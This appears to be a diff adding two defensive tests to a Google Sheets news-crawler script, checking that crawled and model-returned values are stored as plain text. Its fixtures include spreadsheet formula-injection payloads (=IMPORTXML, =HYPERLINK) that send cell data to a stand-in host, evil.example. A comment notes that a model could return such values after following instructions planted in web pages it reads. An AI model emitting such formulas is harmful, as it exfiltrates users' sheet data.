@@ -84,6 +84,21 @@ describe('crawlCore_', () => {
     assert.deepEqual(newest.slice(0, 5), ['pending', '샘플원 신제품 공개', '전자신문', '2025.04.10', 'https://news.google.com/x2']);
   });
 
+  test('크롤한 제목·언론사·주소를 시트가 해석하지 않게 글자 그대로 쓴다 (맨 앞 따옴표 유지, 수식으로 바뀌지 않음)', () => {
+    // 고치기 전에는 시트가 맨 앞 ' 를 '글자로 두기' 표시로 먹어 제목 따옴표가 사라졌고, = 로 시작하면 수식이 됐다
+    const { gs } = loadScript();
+    const sheet = new FakeSheet([HEADER]);
+    gs.fetchGoogleNews_ = () => [
+      { title: "'샘플원' 물류 로봇 공개", url: 'https://n.example/1', media: '=IMPORTXML("https://evil.example/?d="&A1,"//a")', date: '2025.06.01', snippet: '' },
+      { title: '-10% 원가 줄인 샘플테크', url: 'https://n.example/2', media: '+언론사', date: '2025.06.02', snippet: '' },
+    ];
+    gs.fetchNaverNews_ = () => [];
+    assert.equal(gs.crawlCore_(sheet), 2);
+    const byUrl = Object.fromEntries(sheet.rows.slice(1).map((r) => [r[4], r]));
+    assert.deepEqual(byUrl['https://n.example/1'].slice(1, 3), ["'샘플원' 물류 로봇 공개", '=IMPORTXML("https://evil.example/?d="&A1,"//a")']);
+    assert.deepEqual(byUrl['https://n.example/2'].slice(1, 3), ['-10% 원가 줄인 샘플테크', '+언론사']);
+  });
+
   test('새 행의 날짜 칸은 시트가 날짜 값으로 바꾸지 않게 일반 텍스트(@)로 둔다', () => {
     const { gs } = loadScript();
     const sheet = new FakeSheet([
@@ -252,6 +267,21 @@ describe('verifyCore_', () => {
     assert.match(prompt, /게시된 기사 \| 한국경제 \| 2024\.12\.01/);
     assert.match(prompt, /샘플테크\(SampleTech\)는 물류 로봇을/);
     assert.match(prompt, /"샘플테크자산운용"\(자산운용사\)는 이름만 같은 다른 곳/);
+  });
+
+  test('모델이 돌려준 언론사·판단 근거를 시트가 수식으로 바꾸지 않게 글자로 쓰고, 지나치게 긴 값은 자른다', () => {
+    // 웹 검색으로 읽은 페이지에 섞인 지시를 모델이 따르면 =IMPORTXML(...) 같은 값을 돌려줄 수 있다
+    const sheet = new FakeSheet([HEADER, pending('A')]);
+    const { gs } = loadScript({
+      properties: { ANTHROPIC_API_KEY: KEY },
+      responses: [answer({ ours: true, verdict: 'approve', reason: '=HYPERLINK("https://evil.example")' + 'x'.repeat(2000), media: '=IMPORTXML("https://evil.example/?d="&A1,"//a")' })],
+    });
+    gs.verifyCore_(sheet);
+    const [, a] = sheet.rows;
+    assert.equal(a[2], '=IMPORTXML("https://evil.example/?d="&A1,"//a")');
+    assert.equal(typeof a[8], 'string');
+    assert.ok(a[8].startsWith('=HYPERLINK('));
+    assert.equal(a[8].length, 1000);
   });
 
   test('400 같은 요청 오류가 나면 남은 행을 부르지 않고 바로 멈춘다', () => {
